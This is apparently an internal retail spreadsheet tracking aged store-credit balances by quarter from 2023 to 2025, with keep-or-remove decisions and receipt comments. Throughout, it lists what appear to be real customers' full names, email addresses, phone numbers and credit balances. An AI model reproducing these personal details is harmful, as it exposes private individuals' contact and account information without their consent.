Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	10/19/2020	12/2/2020	888032820	Francis	Thomas	(blank)	JT.RES@HOTMAIL.COM	4038606415	110.22	KEEP															
Over 30 Days	8/4/2022	8/4/2022	904022383	Giovanni	Fileccia	(blank)	(blank)	4033692810	734.99	KEEP															
Over 30 Days	8/17/2022	8/18/2022	904017180	Tammi	Andrew	(blank)	(blank)	4037010529	105	KEEP															
Over 30 Days	9/29/2022	10/31/2022	888138441	Jonathan	Habok	(blank)	(blank)	4039234336	84	KEEP															
Over 30 Days	1/29/2023	4/8/2023	937004673	Justin	Pruden	(blank)	(blank)	4034650103	251.99	KEEP															
Over 30 Days	2/7/2023	4/9/2023	904007249	Corbin	Tod	(blank)	corbin.harrison.tod@gmail.com	5875808428	152.08	KEEP															
Over 30 Days	2/7/2023	4/12/2023	904017496	Lucas	Ortega	(blank)	(blank)	4034669004	58.8	KEEP															
Over 30 Days	2/27/2023	2/27/2023	888038615	Christian	Girard	(blank)	christiangirard19@hotmail.com	4035852037	503.98	KEEP															
Over 30 Days	3/8/2023	3/12/2023	504010788	Gord	Lee	(blank)	gordandoi@shaw.ca	4035891321	1,165.50	KEEP															
Over 30 Days	3/13/2023	3/13/2023	904022664	Ryan	Walsh	renegade draught co INC	renegadedraught@gmail.com	8254383745	241.49	KEEP															
Over 30 Days	3/14/2023	3/18/2023	904025313	Derek	metituk	(blank)	(blank)	5879989948	531.29	KEEP															
Over 30 Days	3/14/2023	3/14/2023	4045915	TAI	TIEU	(blank)	TAITIEU@GMAIL.COM	4033709523	419.99	KEEP															
Over 30 Days	3/15/2023	3/15/2023	4065544	judy	wang	(blank)	W4038896129@HOTMAIL.COM.TW	4038896129	262.5	KEEP															
Over 30 Days	3/16/2023	3/16/2023	4064782	Morgan	Thiemann	(blank)	MORTEEMAN@LIVE.COM	4036139046	907.19	KEEP															
Over 30 Days	3/17/2023	3/17/2023	927001039	Scott	Macisaac	(blank)	scott.macisaac@encana.com	4038698978	839.99	KEEP															
Over 30 Days	3/17/2023	4/3/2023	4053011	sandy	kumpic	(blank)	whynotask@hotmail.com	4036815614	157.5	KEEP															
Over 30 Days	3/18/2023	3/18/2023	4046274	JASON	Hart	(blank)	JASONHART13@GMAIL.COM	4034044278	1,484.97	KEEP															
Over 30 Days	3/19/2023	3/19/2023	4056261	rene	Coquet	(blank)	(blank)	4038366589	2,376.53	KEEP															
To be cleaned up	2/3/2023	2/26/2023	888646617	Reid	Cordelle	(blank)	REIDCORDELLE@HOTMAIL.COM	4036503836	0.01	REMOVE															
To be cleaned up	2/13/2023	2/23/2023	927011598	terry	Krahn	(blank)	(blank)	4037015834	0.01	REMOVE															
To be cleaned up	2/24/2023	2/24/2023	904024897	Greg	Bilcik	(blank)	(blank)	2502540044	0.1	REMOVE															
To be cleaned up	3/9/2023	3/10/2023	904025083	Peter	chapman	(blank)	(blank)	4038311242	0.04	REMOVE															
To be cleaned up	3/10/2023	3/14/2023	4048110	lynn	Thomas	(blank)	LYNNTHOMAS@SHAW.CA	4032563397	0.03	REMOVE															
To be cleaned up	3/13/2023	4/13/2023	904024947	Dale	Lakusta	(blank)	(blank)	4036902354	0.05	REMOVE															
To be cleaned up	3/14/2023	3/14/2023	904020056	Chris	REID	(blank)	(blank)	5877272277	0.01	REMOVE															
To be cleaned up	3/21/2023	3/26/2023	888266145	Karin	Smith	(blank)	(blank)	4035199121	0.01	REMOVE															
To be cleaned up	4/11/2023	4/11/2023	904024794	Chris	lapointe	(blank)	(blank)	4038283289	0.01	REMOVE															
																									
Quarter 2 (2023)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	10/19/2020	12/2/2020	888032820	Francis	Thomas	(blank)	JT.RES@HOTMAIL.COM	4038606415	110.22	USED ON REC#330189															
Over 30 Days	8/4/2022	8/4/2022	904022383	Giovanni	Fileccia	(blank)	(blank)	4033692810	734.99	USED ON REC#330204															
Over 30 Days	8/17/2022	8/18/2022	904017180	Tammi	Andrew	(blank)	(blank)	4037010529	105	USED ON REC#330183															
Over 30 Days	9/29/2022	7/5/2023	888138441	Jonathan	Habok	(blank)	(blank)	4039234336	84	USED ON REC#330184															
Over 30 Days	2/7/2023	6/23/2023	904007249	Corbin	Tod	(blank)	corbin.harrison.tod@gmail.com	5875808428	152.08	USING TONIGHT TO RECTIFY EMPLOYEE PURCHASE MADE IN FEB															
Over 30 Days	4/24/2023	6/10/2023	904007874	RON	Odagaki	(blank)	(blank)	4038603050	183.75	KEEP															
Over 30 Days	5/13/2023	5/13/2023	504008137	Mark 	Tonner 	(blank)	mtonner321@gmail.com	4035423358	2,000.00	USED ON REC#327363															
Over 30 Days	5/24/2023	5/24/2023	904001227	TERRY	Taylor	(blank)	(blank)	4038155128	215.25	KEEP															
Over 30 Days	6/15/2023	6/20/2023	904011556	Kyle	bachus	(blank)	(blank)	5875751910	52.49	KEEP															
Over 30 Days	6/16/2023	6/16/2023	904027280	Connie 	Dodd	(blank)	(blank)	5878943495	224.99	KEEP															
Over 30 Days	6/16/2023	7/2/2023	232000739	MATT	Pariseau	(blank)	mpariseau_8@hotmail.com	4033320930	2,039.99	KEEP															
To be cleaned up	5/19/2023	6/23/2023	904017280	Sean	Waits	(blank)	(blank)	5879982393	0.4	Remove															
To be cleaned up	5/25/2023	5/25/2023	904026528	Tim	wiebe	(blank)	(blank)	4033070313	0.01	Remove															
																									
Quarter 3 (2023)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	6/30/2023	8/26/2023	904028017	Matt	Neil	(blank)	MNEIL3@ME.COM	4033719524	806.37	Keep															
Over 30 Days	7/8/2023	7/8/2023	904017084	Bill	Walker	(blank)	(blank)	4038744788	356.99	Keep															
Over 30 Days	7/28/2023	7/28/2023	904028248	Sandy	Anderson	(blank)	awa.anderson@gmail.com	2503482008	15.75	Removed last week															
Over 30 Days	8/17/2023	8/17/2023	232000739	Matt	Pariseau	(blank)	mpariseau_8@hotmail.com	4033320930	156.55	Remove remaining															
Over 30 Days	9/5/2023	9/5/2023	27692123	DON	Bresee	(blank)	DKBRESEE@TELUSPLANET.NET	5872240506	52.49	Removed															
Over 30 Days	9/7/2023	9/7/2023	904003366	wes	CROWE	(blank)	(blank)	4034626639	57.74	RCT# 345331															
Over 30 Days	9/11/2023	9/11/2023	904029920	Leslie	Wilkie	(blank)	(blank)	(blank)	577.49	Keep															
Over 30 Days	9/15/2023	9/15/2023	927006378	Mike	Gilligan	(blank)	(blank)	4032011435	157.49	RCT# 344988															
To be cleaned up	8/10/2023	9/29/2023	888578898	Jay	Angerilli	(blank)	ANGERILLI@SHAW.CA	4036054110	0.01	TO BE REMOVED-PC															
To be cleaned up	8/16/2023	8/16/2023	904002695	Roy	turner	(blank)	(blank)	4034376257	0.02	TO BE REMOVED-PC															
To be cleaned up	8/17/2023	8/17/2023	888286510	Jaret	Miller	(blank)	JARETM@TELUS.NET	4036691714	0.01	TO BE REMOVED-PC															
																									
Quarter 4 (2023)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	11/3/2023	11/3/2023	904028615	Patrick	burke	(blank)	pgburke@shaw.ca	5872263485	456.75	KEEP															
Over 30 Days	11/27/2023	12/12/2023	504005370	Bob	Watson	(blank)	(blank)	4032560573	88.19	KEEP															
Over 30 Days	11/30/2023	11/30/2023	4056796	Mike	Robinson	(blank)	MIKER77@SHAW.CA	4032792970	970.18	KEEP															
																									
Quarter 1 (2024)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	11/15/2018	3/29/2024	888274137	Dan	Lambert	(blank)	(blank)	(blank)	257.22	KEEP															
Over 30 Days	4/27/2019	4/2/2024	888054257	Michael	Olson	(blank)	(blank)	(blank)	262.47	KEEP															
Over 30 Days	9/9/2021	4/13/2024	927002122	Lisa	Arcega	(blank)	(blank)	(blank)	796.95	PROCESSED															
Over 30 Days	7/8/2022	4/11/2024	904021722	Katrina	O'Reilly	(blank)	(blank)	(blank)	2,430.15	PROCESSED															
Over 30 Days	7/14/2022	4/19/2024	45002201	jordan	Daniels	(blank)	(blank)	(blank)	417.36	KEEP															
Over 30 Days	9/2/2022	4/15/2024	904023318	Patrick	Mattheis	(blank)	(blank)	(blank)	839.99	KEEP															
Over 30 Days	5/1/2023	4/9/2024	888035172	Sheldon	Norquay	(blank)	(blank)	(blank)	92.4	KEEP															
Over 30 Days	2/8/2024	2/8/2024	904031231	Tom	barnes	(blank)	(blank)	(blank)	31.23	KEEP															
Over 30 Days	2/9/2024	2/9/2024	937003567	Matt	Chapman	(blank)	(blank)	(blank)	2,099.91	PROCESSED															
Over 30 Days	2/24/2024	2/24/2024	904031489	Max	Wilcox	(blank)	(blank)	(blank)	251.99	KEEP															
Over 30 Days	2/24/2024	3/16/2024	904008670	Matt	Hetchler	(blank)	(blank)	(blank)	42	KEEP															
Over 30 Days	3/7/2024	4/11/2024	904031527	Jim	eliason	(blank)	(blank)	(blank)	1,396.48	KEEP															
Over 30 Days	3/19/2024	3/19/2024	904025189	Garth	Lawless	(blank)	(blank)	(blank)	1,378.07	PROCESSED															
Over 30 Days	3/21/2024	3/21/2024	904031748	John	Hallam	(blank)	(blank)	(blank)	839.99	KEEP															
Over 30 Days	3/23/2024	4/9/2024	904031774	Nathan	Gurr	(blank)	(blank)	(blank)	1,123.62	KEEP															
Over 30 Days	3/23/2024	4/13/2024	888519566	Rob	Suik	(blank)	(blank)	(blank)	147	KEEP															
																									
																									
Quarter 2 (2024)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	2/12/2020	6/23/2020	999100007	DAX	BREWSTER	Cottonwood Golf & Country Club	daxb@cottonwoodgc.com	4039387200	245.83	KEEP															
Over 30 Days	12/19/2023	12/19/2023	999102045	Ametek	CORPORATE Account	Ametek	rod.merz@ametek.com	4032358400	51.45	KEEP															
Over 30 Days	2/8/2024	2/8/2024	904031231	tom	barnes	(blank)	(blank)	4033939091	31.23	KEEP															
Over 30 Days	4/30/2024	4/30/2024	27691048	hal	khuu	(blank)	HALKHUU@HOTMAIL.COM	4034636284	21	KEEP															
Over 30 Days	5/7/2024	6/17/2024	888000221	dave	Mah	(blank)	DAVEM@CTCMAGAZINES.COM	4036151572	62.46	KEEP															
Over 30 Days	5/16/2024	5/16/2024	904029437	raymond	mcguines	(blank)	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP															
Over 30 Days	5/19/2024	5/27/2024	37130348	Stephen	Hope	(blank)	(blank)	4038279650	419.97	KEEP															
Over 30 Days	5/21/2024	5/28/2024	937010095	Brenda	Sim	(blank)	(blank)	4038896090	593.25	KEEP															
Over 30 Days	5/25/2024	7/5/2024	904024954	Hyokjong	kWON	(blank)	(blank)	4036072242	1,128.75	KEEP															
Over 30 Days	5/28/2024	5/28/2024	904004974	Jim	HUNT	(blank)	jimhunt99@gmail.com	4032787841	1,663.16	KEEP															
Over 30 Days	6/4/2024	6/18/2024	4056159	Tj	Calara	(blank)	(blank)	4036065492	2,219.95	KEEP															
Over 30 Days	6/9/2024	6/22/2024	27694876	JASON	Bazylinski	(blank)	JASON.BASYLINSKI@SHAW.CA	4032413991	18.9	KEEP															
Over 30 Days	6/11/2024	6/11/2024	937012074	JASON	Ngo	(blank)	(blank)	5879983088	472.49	KEEP															
Over 30 Days	6/12/2024	6/12/2024	904033462	Mark	Calkhoven	(blank)	markcalkhoven@gmail.com	(blank)	1,559.96	KEEP															
To be cleaned up	4/29/2024	5/5/2024	904014330	Tabitha	Tatum	(blank)	(blank)	3106966591	0	TO BE REMOVED-PC															
To be cleaned up	6/3/2024	6/3/2024	999102813	Lennow Industries Ltd.	CORPORATE Account	Lennox Industries Ltd.	cathy.macewen@lennoxind.com	5879971532	0.01	TO BE REMOVED-PC															
To be cleaned up	6/6/2024	6/7/2024	888138250	Darren	tait	(blank)	DAROLE@TELUS.NET	4036400459	0.08	TO BE REMOVED-PC															
																									
Quarter 3 (2024)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	2/12/2020	6/23/2020	999100007	Dax	BREWSTER	Cottonwood Golf & Country Club	daxb@cottonwoodgc.com	4039387200	245.83	KEEP															
Over 30 Days	12/19/2023	12/19/2023	999102045	Ametek	CORPORATE Account	Ametek	rod.merz@ametek.com	4032358400	51.45	KEEP															
Over 30 Days	2/8/2024	2/8/2024	904031231	tom	barnes	(blank)	(blank)	4033939091	31.23	KEEP															
Over 30 Days	4/30/2024	4/30/2024	27691048	hal	khuu	(blank)	HALKHUU@HOTMAIL.COM	4034636284	21	KEEP															
Over 30 Days	5/7/2024	6/17/2024	888000221	Dave	Mah	(blank)	DAVEM@CTCMAGAZINES.COM	4036151572	62.46	KEEP															
Over 30 Days	5/16/2024	5/16/2024	904029437	raymond	mcguines	(blank)	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP															
Over 30 Days	5/21/2024	5/28/2024	937010095	Brenda	Sim	(blank)	(blank)	4038896090	593.25	KEEP															
Over 30 Days	5/25/2024	10/4/2024	904024954	Hyokjong	kWON	(blank)	(blank)	4036072242	1,128.75	KEEP															
Over 30 Days	6/15/2024	7/29/2024	904029425	Crystal	Samela	(blank)	(blank)	4038806999	251.99	KEEP															
Over 30 Days	6/19/2024	9/23/2024	888515301	David Reis	CORPORATE Account	Benjamin Moore Co.	dreis70@gmail.com	4034634730	3.19	REMOVE															
Over 30 Days	6/19/2024	10/4/2024	954016146	Kessler	Bishop	(blank)	(blank)	4036649122	498.04	KEEP															
Over 30 Days	7/10/2024	9/9/2024	4032718	robert	BRANDER	(blank)	t21brander@yahoo.com	4039690907	52.5	KEEP															
Over 30 Days	7/13/2024	7/13/2024	527010400	Cameron	Olson	(blank)	cameron.olson@me.com	4036128375	1.25	REMOVE															
Over 30 Days	7/27/2024	7/27/2024	27677005	Joe	horler	(blank)	JHORLER@SHAW.CA	4032548725	273	KEEP															
Over 30 Days	7/30/2024	9/21/2024	937000042	Dax	BREWSTER	(blank)	dbrewster@golftown.com	4036813449	881.97	KEEP															
Over 30 Days	8/9/2024	8/16/2024	904020038	Jeremy	Hart	(blank)	(blank)	5874327451	80.47	KEEP															
Over 30 Days	8/21/2024	8/21/2024	4051617	Mike	Noblett	(blank)	(blank)	4036291499	41.99	KEEP															
Over 30 Days	8/29/2024	8/29/2024	904011544	CSN Wine & Spirits	CORPORATE Account	CSN Wine & Spirits	(blank)	4036894346	791.55	KEEP															
Over 30 Days	8/30/2024	9/26/2024	904008209	Jamie	Petit	(blank)	(blank)	4033718756	21	KEEP															
Over 30 Days	9/7/2024	9/7/2024	904035276	Kevin	Bird	(blank)	(blank)	4035875227	382.19	KEEP															
To be cleaned up	7/15/2024	7/15/2024	904034091	melanie	Nahayowski	(blank)	(blank)	4038131776	0.4	REMOVE															
To be cleaned up	8/13/2024	8/13/2024	904032859	Marc	Staniloff	(blank)	(blank)	4038609488	0.01	REMOVE															
To be cleaned up	9/18/2024	9/18/2024	999101607	Prairie West Meats	CORPORATE Account	Prairie West Meats	taras@cfoods.ca	4033395229	0.08	REMOVE															
																									
Quarter 4 (2024)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	2/12/2020	6/23/2020	999100007	DAX	BREWSTER	Cottonwood Golf & Country Club	daxb@cottonwoodgc.com	4039387200	245.83	KEEP															
Over 30 Days	2/8/2024	2/8/2024	904031231	tom	barnes	(blank)	(blank)	4033939091	31.23	REMOVE															
Over 30 Days	4/30/2024	12/28/2024	27691048	Hal	khuu	(blank)	HALKHUU@HOTMAIL.COM	4034636284	21	KEEP															
Over 30 Days	5/7/2024	1/5/2025	888000221	Dave	Mah	(blank)	DAVEM@CTCMAGAZINES.COM	4036151572	62.46	KEEP															
Over 30 Days	5/16/2024	5/16/2024	904029437	raymond	mcguines	(blank)	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP															
Over 30 Days	7/10/2024	12/3/2024	4032718	Robert	BRANDER	(blank)	t21brander@yahoo.com	4039690907	52.5	Processed															
Over 30 Days	7/13/2024	11/17/2024	527010400	Cameron	Olson	(blank)	cameron.olson@me.com	4036128375	1.25	REMOVE															
Over 30 Days	7/27/2024	7/27/2024	27677005	Joe	horler	(blank)	JHORLER@SHAW.CA	4032548725	273	Processed															
Over 30 Days	7/30/2024	9/21/2024	937000042	DAX	BREWSTER	(blank)	dbrewster@golftown.com	4036813449	881.97	Processed															
Over 30 Days	8/30/2024	9/26/2024	904008209	Jamie	Petit	(blank)	(blank)	4033718756	21	KEEP															
Over 30 Days	9/20/2024	9/20/2024	888816706	Terry	PEARCE	(blank)	PEARCETERRY@SHAW.CA	4035197150	83.99	KEEP															
Over 30 Days	10/4/2024	10/11/2024	904035551	Gordon	Cheney	(blank)	(blank)	4038540582	382.03	KEEP															
Over 30 Days	10/10/2024	10/10/2024	937019962	Logan	Biever	(blank)	(blank)	5204140012	251.9	KEEP															
Over 30 Days	10/22/2024	12/13/2024	888305832	dan	Dubeau	(blank)	(blank)	4036015278	308.69	KEEP															
Over 30 Days	10/29/2024	10/29/2024	888401462	LOC	DUONG	(blank)	DUONG_LOC@HOTMAIL.COM	4039702037	482.98	KEEP															
Over 30 Days	11/21/2024	11/21/2024	888160299	RICHARD	Corvari	(blank)	RICHARD-CORVARI@SHAW.CA	2508092588	735	KEEP															
Over 30 Days	11/30/2024	11/30/2024	904027334	Kenny	Nicholls	(blank)	(blank)	4036204761	629.99	KEEP															
Over 30 Days	11/30/2024	12/22/2024	4054103	Steven	Burke	(blank)	CSBURKE@SHAW.CA	4037712103	272.99	Processed															
Over 30 Days	12/7/2024	12/23/2024	888125725	Dave	Rogers	(blank)	DAVE.ROGERS@SHAW.CA	4032716277	75.58	KEEP															
To be cleaned up	10/11/2024	10/11/2024	904035322	CHRIS	Revereza	(blank)	(blank)	4036144665	0.02	REMOVE															
To be cleaned up	10/21/2024	10/21/2024	904011544	CSN Wine & Spirits	CORPORATE Account	CSN Wine & Spirits	(blank)	4036894346	0.01	REMOVE															
To be cleaned up	11/29/2024	12/7/2024	904035840	Adam	klinzmann	(blank)	(blank)	4036505066	0.02	REMOVE															
To be cleaned up	12/4/2024	12/4/2024	904012220	brent	davey	(blank)	(blank)	9052441365	0.03	REMOVE															
																									
																									
Quarter 1 (2025)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	2/12/2020	6/23/2020	999100007	Dax	BREWSTER	Cottonwood Golf & Country Club	daxb@cottonwoodgc.com	4039387200	245.83	KEEP															
Over 30 Days	4/30/2024	2/17/2025	27691048	Hal	khuu	(blank)	HALKHUU@HOTMAIL.COM	4034636284	21	REMOVE															
Over 30 Days	5/16/2024	5/16/2024	904029437	Raymond	mcguines	(blank)	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP															
Over 30 Days	7/13/2024	11/17/2024	527010400	Cameron	Olson	(blank)	cameron.olson@me.com	4036128375	1.25	REMOVE															
Over 30 Days	8/30/2024	3/15/2025	904008209	jamie	Petit	(blank)	(blank)	4033718756	21	REMOVE															
Over 30 Days	9/20/2024	9/20/2024	888816706	Terry	PEARCE	(blank)	PEARCETERRY@SHAW.CA	4035197150	83.99	REMOVE															
Over 30 Days	10/4/2024	10/11/2024	904035551	Gordon	Cheney	(blank)	(blank)	4038540582	382.03	KEEP															
Over 30 Days	10/10/2024	1/12/2025	937019962	logan	Biever	(blank)	(blank)	5204140012	251.9	KEEP															
Over 30 Days	10/22/2024	2/21/2025	888305832	Dan	Dubeau	(blank)	(blank)	4036015278	308.69	KEEP															
Over 30 Days	11/21/2024	1/15/2025	888160299	Richard	Corvari	(blank)	RICHARD-CORVARI@SHAW.CA	2508092588	735	KEEP															
Over 30 Days	12/14/2024	12/14/2024	904035972	Glenn	Vanidenstine	(blank)	(blank)	4037025788	548.38	KEEP															
Over 30 Days	1/6/2025	1/6/2025	904026952	ROB	CENNON	(blank)	ROBCENNON@GMAIL.COM	8259942532	385.86	KEEP															
Over 30 Days	1/23/2025	3/17/2025	904034988	Cori	Fraser	(blank)	(blank)	4033151283	596.17	KEEP															
Over 30 Days	1/28/2025	1/28/2025	888000221	Dave	Mah	(blank)	DAVEM@CTCMAGAZINES.COM	4036151572	62.46	REMOVE															
Over 30 Days	2/11/2025	2/22/2025	504005441	Oliver 	Hunt 	(blank)	oliver.hunt4@gmail.com	4038130466	283.5	KEEP															
Over 30 Days	2/17/2025	2/17/2025	27683600	jeff	Macdonald	(blank)	JEFF@SUREFIREINDUSTRIES.CA	4032009869	157.5	PROCESSED															
Over 30 Days	2/17/2025	4/5/2025	23376903	mike	FITZGERALD	(blank)	mikeotto54@hotmail.com	7809014003	409.5	KEEP															
Over 30 Days	2/21/2025	4/1/2025	527004710	Dale	Murdock	(blank)	dm@hotmail.com	3065512298	944.98	KEEP															
Over 30 Days	3/1/2025	3/1/2025	904003265	Emerson	Frostad	(blank)	(blank)	4033831358	314.94	KEEP															
Over 30 Days	3/7/2025	4/6/2025	904007688	johnny	Audia	(blank)	(blank)	4035852834	1,241.99	KEEP															
Over 30 Days	3/8/2025	4/5/2025	4036710	jeff	Dods	(blank)	JEFF@TRUEFENCE.COM	4033718276	2,932.58	KEEP															
																									
																									
Quarter 2 (2025)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	2/12/2020	6/23/2020	999100007	Dax	Brewster	Cottonwood Golf & Country Club	daxb@cottonwoodgc.com	4039387200	245.83	KEEP															
Over 30 Days	5/16/2024	6/25/2025	904029437	Raymond	mcguines	(blank)	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP															
Over 30 Days	10/4/2024	10/11/2024	904035551	Gordon	Cheney	(blank)	(blank)	4038540582	382.03	KEEP															
Over 30 Days	10/10/2024	1/12/2025	937019962	Logan	Biever	(blank)	(blank)	5204140012	251.9	KEEP															
Over 30 Days	10/22/2024	4/16/2025	888305832	Dan	Dubeau	(blank)	(blank)	4036015278	308.69	KEEP															
Over 30 Days	11/21/2024	1/15/2025	888160299	Richard	Corvari	(blank)	RICHARD-CORVARI@SHAW.CA	2508092588	735	KEEP															
Over 30 Days	12/14/2024	12/14/2024	904035972	GLENN	Vanidenstine	(blank)	(blank)	4037025788	548.38	KEEP 															
Over 30 Days	1/28/2025	1/28/2025	888000221	Dave	Mah	(blank)	DAVEM@CTCMAGAZINES.COM	4036151572	62.46	KEEP															
Over 30 Days	2/11/2025	7/6/2025	504005441	OLIVER 	Hunt 	(blank)	oliver.hunt4@gmail.com	4038130466	283.5	KEEP															
Over 30 Days	2/21/2025	7/2/2025	527004710	Dale	Murdock	(blank)	dm@hotmail.com	3065512298	944.98	KEEP 															
Over 30 Days	3/7/2025	5/20/2025	904007688	Johnny	Audia	(blank)	(blank)	4035852834	1,241.99	KEEP 															
Over 30 Days	3/13/2025	3/13/2025	27689725	Darrin	Lavialette	(blank)	darrinhemi@shaw.ca	4038270085	68.24	KEEP 															
Over 30 Days	3/20/2025	7/3/2025	954016146	Kessler	Bishop	(blank)	(blank)	4036649122	369.6	KEEP 															
Over 30 Days	3/31/2025	6/9/2025	504011702	darrel	leray	(blank)	null@shaw.ca	4038364077	734.99	KEEP															
Over 30 Days	4/28/2025	4/28/2025	904031626	Kenton	Van Doesburg	(blank)	kentonvandoesburg@gmail.com	5878941818	1.96	REMOVE															
Over 30 Days	5/14/2025	6/5/2025	504007994	Corey	Conlon	(blank)	coreycolnlon19@gmail.com	7802287479	52.49	KEEP 															
Over 30 Days	5/22/2025	5/22/2025	37118961	kent	webber	(blank)	KENTGWEBBER@GMAIL.COM	4038701048	1,442.13	KEEP															
Over 30 Days	5/27/2025	5/27/2025	904038195	Teresa	Augustyn	(blank)	(blank)	4034646844	374.93	KEEP															
Over 30 Days	5/28/2025	5/28/2025	904033493	Chris	chartrand	(blank)	chrisbchartrand@gmail.com	5878915617	912.73	KEEP 															
Over 30 Days	5/28/2025	7/6/2025	999105049	jason	Chau	Canadian Sleep Surgery Clinic	jasonchau88@yahoo.com	4039928383	647.85	KEEP															
Over 30 Days	5/30/2025	6/8/2025	504016489	Gordon	robertson	(blank)	(blank)	4036690913	601.11	KEEP															
																									
																									
Quarter 3 (2025)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	2/12/2020	6/23/2020	999100007	Dax	Brewster	Cottonwood Golf & Country Club	daxb@cottonwoodgc.com	4039387200	245.83	KEEP															
Over 30 Days	5/16/2024	6/25/2025	904029437	raymond	mcguines	(blank)	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP															
Over 30 Days	2/21/2025	8/16/2025	527004710	Dale	Murdock	(blank)	dm@hotmail.com	3065512298	944.98	KEEP															
Over 30 Days	5/14/2025	6/5/2025	504007994	Corey	Conlon	(blank)	coreycolnlon19@gmail.com	7802287479	52.49	KEEP															
Over 30 Days	5/27/2025	5/27/2025	904038195	Teresa	Augustyn	(blank)	(blank)	4034646844	374.93	PROCESSED															
Over 30 Days	6/14/2025	6/14/2025	4043164	Greg	Horne	(blank)	null@shaw.ca	5877777460	64.58	KEEP															
Over 30 Days	6/30/2025	6/30/2025	905023139	Michael	Kindrachuk	(blank)	mnkindrachuk@gmail.com	3067173916	59.98	REMOVE															
Over 30 Days	7/1/2025	8/27/2025	504012974	Domingo	Alvarado	(blank)	(blank)	4037008248	31.49	PROCESSED															
Over 30 Days	7/5/2025	7/5/2025	504009013	Charles	Cheon	(blank)	null@shaw.ca	5872278949	13.65	KEEP															
Over 30 Days	7/17/2025	7/17/2025	904039395	Max	Dodd	(blank)	(blank)	2504157496	1,469.93	KEEP															
Over 30 Days	7/19/2025	9/4/2025	904039446	Audra	Ford	(blank)	audra.rawlinson@gmail.com	4038628278	104.99	KEEP															
Over 30 Days	7/23/2025	8/28/2025	888056165	Greg	Hine	(blank)	(blank)	9054644363	356.97	PROCESSED															
Over 30 Days	7/26/2025	8/30/2025	504016489	gordon	Robertson	(blank)	(blank)	4036690913	18.38	REMOVE															
Over 30 Days	7/28/2025	9/12/2025	904014712	David	Meyer	(blank)	(blank)	4039218187	157.5	KEEP															
Over 30 Days	8/1/2025	8/1/2025	904035972	Glenn	Vanidenstine	(blank)	(blank)	4037025788	26.11	REMOVE															
Over 30 Days	8/1/2025	9/18/2025	904007688	Johnny	Audia	(blank)	(blank)	4035852834	59.16	REMOVE															
Over 30 Days	8/6/2025	8/6/2025	906025769	Jugaansan 	Thayalan	Tamil Golfers Network	(blank)	6473393927	140.11	KEEP															
Over 30 Days	8/14/2025	8/14/2025	904039952	Hudson	Brett	(blank)	(blank)	8254317931	810.6	KEEP															
Over 30 Days	8/14/2025	8/14/2025	4036379	Ron	Kellam	(blank)	RGKELLAM@HUGHES.NET	4032575454	965.98	KEEP															
Over 30 Days	8/22/2025	8/28/2025	888637188	taylor	burnside	(blank)	TAYLOR_BURNSIDE@HOTMAIL.COM	4039731776	503.99	PROCESSED															
Over 30 Days	8/28/2025	8/28/2025	904040193	bernie	Parsons	(blank)	(blank)	7802152999	64.98	KEEP															
Over 30 Days	9/3/2025	9/3/2025	4059427	Crystal	Wong	(blank)	CWONG1@TELUSPLANET.NET	2502170158	26.25	PROCESSED															
																									
																									
Quarter 4 (2025)																									
Store Credit Aging	LAST CREATED_DATE	LAST_SALE_DATE	CUST_ID	FIRST_NAME	LAST_NAME	Company	EMAIL	PHONE	Sum of Store Credit Balance	KEEP or REMOVE	COMMENTS	Approved by (Full Name)													
Over 30 Days	5/16/2024	6/25/2025	904029437	raymond	mcguines	(blank)	raymondmcguineswb@gmail.com	5878999094	251.99	KEEP 															
Over 30 Days	2/21/2025	8/16/2025	527004710	Dale	Murdock	(blank)	dm@hotmail.com	3065512298	944.98	KEEP 															
Over 30 Days	5/14/2025	6/5/2025	504007994	Corey	Conlon	(blank)	coreycolnlon19@gmail.com	7802287479	52.49	PROCESSED															
